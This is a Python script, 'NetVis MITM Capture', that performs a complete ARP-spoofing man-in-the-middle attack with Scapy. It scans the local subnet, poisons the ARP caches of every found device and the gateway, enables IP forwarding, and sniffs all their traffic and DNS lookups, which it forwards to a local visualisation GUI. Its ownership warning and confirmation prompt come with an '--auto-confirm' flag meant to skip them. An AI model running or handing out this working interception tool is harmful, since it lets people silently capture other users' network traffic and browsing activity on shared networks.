#!/usr/bin/env python3
"""
NetVis MITM Capture - Integrated with GUI
==========================================

This script performs ARP spoofing to capture ALL network traffic
and sends the data to the NetVis web GUI for visualization.

WARNING: ONLY USE ON NETWORKS YOU OWN AND CONTROL!

Usage:
    sudo python mitm_capture.py
"""

import sys
import os
import time
import signal
import threading
import json
import urllib.request
import urllib.error
from datetime import datetime

print("\n" + "="*60)
print("  NetVis MITM Capture - Network Traffic Interceptor")
print("  📡 Integrated with NetVis GUI")
print("="*60)

# Check for root
if os.geteuid() != 0:
    print("\n❌ ERROR: This script requires root privileges")
    print("   Run with: sudo python mitm_capture.py\n")
    sys.exit(1)

print("✓ Running as root")

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, DNS, DNSQR,
        sendp, sniff, get_if_hwaddr, getmacbyip, conf, arping
    )
    print("✓ Scapy loaded")
except ImportError:
    print("❌ ERROR: Scapy not installed. Run: pip install scapy")
    sys.exit(1)

import subprocess

# Configuration
GUI_URL = "http://localhost:5001"  # NetVis server
SYNC_INTERVAL = 2  # Seconds between GUI updates

def get_default_gateway():
    """Get default gateway IP"""
    try:
        result = subprocess.run(['netstat', '-rn'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if line.startswith('default') or '0.0.0.0' in line:
                parts = line.split()
                for part in parts:
                    if part.count('.') == 3 and part != '0.0.0.0':
                        return part
    except:
        pass
    return None

def get_local_ip():
    """Get local IP address"""
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None

def enable_ip_forwarding():
    """Enable IP forwarding"""
    try:
        subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=1'], capture_output=True)
        return True
    except:
        return False

def disable_ip_forwarding():
    """Disable IP forwarding"""
    try:
        subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=0'], capture_output=True)
    except:
        pass

def get_mac(ip):
    """Get MAC address for an IP"""
    try:
        return getmacbyip(ip)
    except:
        return None

def arp_spoof(target_ip, spoof_ip, target_mac):
    """Send ARP reply to target claiming to be spoof_ip"""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    sendp(packet, verbose=False)

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restore ARP tables"""
    packet1 = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    sendp(packet1, count=3, verbose=False)
    sendp(packet2, count=3, verbose=False)


class MITMCapture:
    def __init__(self):
        self.gateway_ip = get_default_gateway()
        self.local_ip = get_local_ip()
        self.gateway_mac = None
        self.targets = {}
        self.running = False
        
        self.connections = {}
        self.dns_queries = []
        self.packets_captured = 0
        self.bytes_captured = 0
        
        # For GUI sync
        self.pending_connections = []
        self.pending_dns = []
        self.gui_connected = False
        
        print(f"\n📍 Network Info:")
        print(f"   Local IP:   {self.local_ip}")
        print(f"   Gateway IP: {self.gateway_ip}")
        
    def send_to_gui(self, endpoint, data):
        """Send data to the NetVis GUI"""
        try:
            url = f"{GUI_URL}{endpoint}"
            req = urllib.request.Request(
                url,
                data=json.dumps(data).encode('utf-8'),
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=2) as response:
                return json.loads(response.read().decode())
        except urllib.error.URLError as e:
            if not self.gui_connected:
                print(f"   ⚠️  GUI not reachable: {GUI_URL}")
            return None
        except Exception as e:
            if not self.gui_connected:
                print(f"   ⚠️  GUI sync error: {e}")
            return None
    
    def sync_with_gui(self):
        """Periodically sync data with the GUI"""
        while self.running:
            try:
                # Send devices with enrichment hints
                devices_data = [
                    {'ip': ip, 'mac': mac}
                    for ip, mac in self.targets.items()
                ]
                # Also add gateway
                if self.gateway_ip and self.gateway_mac:
                    devices_data.append({'ip': self.gateway_ip, 'mac': self.gateway_mac})
                
                if devices_data:
                    result = self.send_to_gui('/api/mitm/devices', {'devices': devices_data})
                    if result and not self.gui_connected:
                        self.gui_connected = True
                        print("   ✓ Connected to NetVis GUI")
                
                # Send traffic data with all connections
                connections_to_send = []
                for key, conn in list(self.connections.items()):
                    # Include ALL connections (even multicast)
                    connections_to_send.append({
                        'src_ip': conn['src_ip'],
                        'dst_ip': conn['dst_ip'],
                        'src_port': conn['src_port'],
                        'dst_port': conn['dst_port'],
                        'protocol': conn['protocol'],
                        'packets': conn['packets'],
                        'bytes': conn['bytes'],
                        'first_seen': conn.get('first_seen', '')
                    })
                
                dns_to_send = list(self.pending_dns[-100:])  # Last 100 DNS queries
                self.pending_dns = self.pending_dns[-100:]  # Keep some for context
                
                if connections_to_send or dns_to_send:
                    result = self.send_to_gui('/api/mitm/traffic', {
                        'connections': connections_to_send,
                        'dns_queries': dns_to_send,
                        'packets': self.packets_captured,
                        'bytes': self.bytes_captured
                    })
                    if result:
                        if not self.gui_connected:
                            self.gui_connected = True
                            print("   ✓ Connected to NetVis GUI")
                        device_count = result.get('devices', 0)
                        conn_count = result.get('connections_updated', 0)
                        # Show periodic updates
                        if self.packets_captured % 500 == 0:
                            print(f"   📊 Synced: {self.packets_captured} pkts, {len(connections_to_send)} conns → GUI ({device_count} nodes)")
                
            except Exception as e:
                pass
            
            time.sleep(SYNC_INTERVAL)
    
    def discover_targets(self):
        """Discover devices using ARP scan"""
        print(f"\n🔍 Scanning network for devices...")
        
        self.gateway_mac = get_mac(self.gateway_ip)
        if not self.gateway_mac:
            print(f"   ❌ Could not get gateway MAC")
            return False
        print(f"   Gateway MAC: {self.gateway_mac}")
        
        network = '.'.join(self.local_ip.split('.')[:-1]) + '.0/24'
        print(f"   Scanning: {network}")
        
        try:
            answered, _ = arping(network, timeout=3, verbose=False)
            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc
                if ip != self.local_ip and ip != self.gateway_ip:
                    self.targets[ip] = mac
                    print(f"   ✓ Found: {ip} ({mac})")
        except Exception as e:
            print(f"   ❌ Scan error: {e}")
            return False
            
        print(f"\n   Found {len(self.targets)} target devices")
        return len(self.targets) > 0
    
    def spoof_loop(self):
        """Continuously send ARP spoofs"""
        while self.running:
            try:
                for target_ip, target_mac in self.targets.items():
                    arp_spoof(self.gateway_ip, target_ip, self.gateway_mac)
                    arp_spoof(target_ip, self.gateway_ip, target_mac)
            except:
                pass
            time.sleep(2)
    
    def process_packet(self, packet):
        """Process captured packet"""
        try:
            self.packets_captured += 1
            self.bytes_captured += len(packet)
            
            if IP not in packet:
                return
                
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Skip our own traffic
            if src_ip == self.local_ip or dst_ip == self.local_ip:
                return
            
            protocol = "IP"
            src_port = 0
            dst_port = 0
            
            if TCP in packet:
                protocol = "TCP"
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
            elif UDP in packet:
                protocol = "UDP"
                src_port = packet[UDP].sport
                dst_port = packet[UDP].dport
            
            key = f"{src_ip}:{src_port}->{dst_ip}:{dst_port}"
            if key not in self.connections:
                self.connections[key] = {
                    'src_ip': src_ip, 'dst_ip': dst_ip, 'protocol': protocol,
                    'src_port': src_port, 'dst_port': dst_port,
                    'packets': 0, 'bytes': 0,
                    'first_seen': datetime.now().isoformat()
                }
                print(f"   📡 {src_ip}:{src_port} → {dst_ip}:{dst_port} ({protocol})")
                
            self.connections[key]['packets'] += 1
            self.connections[key]['bytes'] += len(packet)
            
            # DNS inspection
            if DNS in packet and packet[DNS].qd:
                try:
                    domain = packet[DNS].qd.qname.decode().rstrip('.')
                    self.dns_queries.append({'src_ip': src_ip, 'domain': domain})
                    self.pending_dns.append({'src_ip': src_ip, 'domain': domain})
                    print(f"   🌐 DNS: {src_ip} → {domain}")
                except:
                    pass
                    
        except:
            pass
    
    def capture_loop(self):
        """Capture packets"""
        print("\n📡 Packet capture started...")
        try:
            sniff(filter="ip", prn=self.process_packet, store=False, 
                  stop_filter=lambda x: not self.running)
        except Exception as e:
            print(f"   Capture error: {e}")
    
    def start(self):
        """Start MITM capture"""
        print("\n⚡ Starting MITM capture...")
        
        if not enable_ip_forwarding():
            print("   ❌ Failed to enable IP forwarding")
            return False
        print("   ✓ IP forwarding enabled")
            
        if not self.discover_targets():
            print("   ❌ No targets found")
            return False
        
        self.running = True
        
        # Start GUI sync thread
        self.sync_thread = threading.Thread(target=self.sync_with_gui, daemon=True)
        self.sync_thread.start()
        print("   ✓ GUI sync started")
        
        # Start spoofing
        self.spoof_thread = threading.Thread(target=self.spoof_loop, daemon=True)
        self.spoof_thread.start()
        print("   ✓ ARP spoofing started")
        
        # Start capture
        self.capture_thread = threading.Thread(target=self.capture_loop, daemon=True)
        self.capture_thread.start()
        
        return True
    
    def stop(self):
        """Stop and restore network"""
        print("\n\n🛑 Stopping MITM capture...")
        self.running = False
        
        print("   Restoring ARP tables...")
        for target_ip, target_mac in self.targets.items():
            restore_arp(target_ip, self.gateway_ip, target_mac, self.gateway_mac)
            restore_arp(self.gateway_ip, target_ip, self.gateway_mac, target_mac)
        
        disable_ip_forwarding()
        print("   ✓ Network restored")
        
        print(f"\n📊 Capture Statistics:")
        print(f"   Packets: {self.packets_captured}")
        print(f"   Bytes: {self.bytes_captured}")
        print(f"   Connections: {len(self.connections)}")
        print(f"   DNS Queries: {len(self.dns_queries)}")
        
        if self.connections:
            print("\n📈 Top Connections:")
            sorted_conns = sorted(self.connections.values(), key=lambda x: -x['bytes'])[:10]
            for conn in sorted_conns:
                print(f"   {conn['src_ip']}:{conn['src_port']} → {conn['dst_ip']}:{conn['dst_port']} ({conn['bytes']} bytes)")
        
        if self.dns_queries:
            print("\n🌐 DNS Queries (last 15):")
            for q in self.dns_queries[-15:]:
                print(f"   {q['src_ip']} → {q['domain']}")


def main():
    print("\n" + "!"*60)
    print("  ⚠️  WARNING: ARP Spoofing - Use only on YOUR network!")
    print("!"*60)
    
    print(f"\n📺 GUI will be updated at: {GUI_URL}")
    print("   Make sure the NetVis server is running!")
    print("   Start it with: python server.py")
    
    # Check for auto-confirm flag (set by GUI or command line)
    auto_confirm = 'AUTO_CONFIRM' in dir() and AUTO_CONFIRM
    
    if not auto_confirm:
        confirm = input("\nType 'yes' to confirm you own this network: ")
        if confirm.lower() != 'yes':
            print("Aborting.")
            sys.exit(0)
    else:
        print("\n   [Auto-confirmed via GUI]")
    
    mitm = MITMCapture()
    
    def signal_handler(sig, frame):
        mitm.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    if mitm.start():
        print("\n" + "-"*60)
        print("   MITM Active - Data syncing to GUI")
        print("   Open http://localhost:3000 to see traffic")
        print("   Press Ctrl+C to stop")
        print("-"*60 + "\n")
        
        while mitm.running:
            time.sleep(1)
    else:
        print("\n❌ Failed to start MITM capture")
        sys.exit(1)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='NetVis MITM Capture')
    parser.add_argument('--gui', action='store_true', help='Started from GUI (quieter output)')
    parser.add_argument('--auto-confirm', action='store_true', help='Skip confirmation prompt')
    args = parser.parse_args()
    
    # Store args globally for use in main()
    GUI_MODE = args.gui
    AUTO_CONFIRM = args.auto_confirm
    
    main()
